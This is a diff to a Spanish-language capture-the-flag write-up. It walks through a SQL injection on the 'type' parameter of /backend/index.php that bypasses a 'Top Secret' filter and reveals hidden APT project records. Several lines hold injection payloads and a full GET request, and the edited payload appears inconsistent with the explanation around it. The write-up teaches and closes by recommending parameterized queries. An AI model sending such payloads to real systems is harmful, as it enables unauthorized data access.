@@ -130,7 +130,7 @@ A partir de ese punto es posible introducir condiciones SQL adicionales.
 Se prueba el siguiente valor:
 
 ```text
-type=3' AND '1'='1' -- -
+type='' AND '1'='1' -- -
 ```
 
 La expresión:
@@ -152,7 +152,7 @@ permite comentar el resto de la consulta SQL en MySQL.
 De forma conceptual, la consulta pasa a comportarse como:
 
 ```sql
-WHERE p.tipo = '3'
+WHERE p.tipo = ''
 AND '1'='1'
 -- resto de la consulta
 ```
@@ -175,7 +175,7 @@ Esta condición impide que los proyectos con nivel **Top Secret** sean incluidos
 Al utilizar:
 
 ```text
-type=3' AND '1'='1' -- -
+type='' AND '1'='1' -- -
 ```
 
 se consigue modificar la consulta SQL y evitar la aplicación de dicha condición.
@@ -187,7 +187,7 @@ El servidor responde entonces con información que anteriormente no estaba dispo
 La petición utilizada es:
 
 ```http
-GET /backend/index.php?type=3' AND '1'='1' -- -
+GET /backend/index.php?type='' AND '1'='1' -- -
 ```
 
 La respuesta obtenida contiene los siguientes proyectos:
@@ -206,7 +206,7 @@ Entre los resultados aparecen finalmente los dos proyectos APT:
 NS4_B2W
 Terrorists - 141e9ea9d1c4ade203ffe3ee03ebff1c
 ```
-
+![Código](resources/codigo.png)
 y:
 
 ```text
@@ -277,17 +277,3 @@ NS4_OIL - EkoParty destruction
 ```
 
 El desafío demuestra la importancia de utilizar **consultas SQL parametrizadas**, validar correctamente los datos recibidos desde el cliente y aplicar los controles de autorización de forma segura en el servidor.
-
-## Evidencias
-
-> Agregar aquí las capturas correspondientes al proceso:
->
-> * Tabla inicial de empleados y proyectos.
-> * Petición `GET /backend/index.php?type=3`.
-> * Respuesta vacía para `type=3`.
-> * Petición con `type=3'`.
-> * Error de sintaxis SQL mostrando el filtro `Top Secret`.
-> * Payload `type=3' AND '1'='1' -- -`.
-> * Respuesta mostrando los proyectos APT.
-> * Proyecto `NS4_B2W` y su información.
-> * Proyecto `NS4_OIL` y su información.
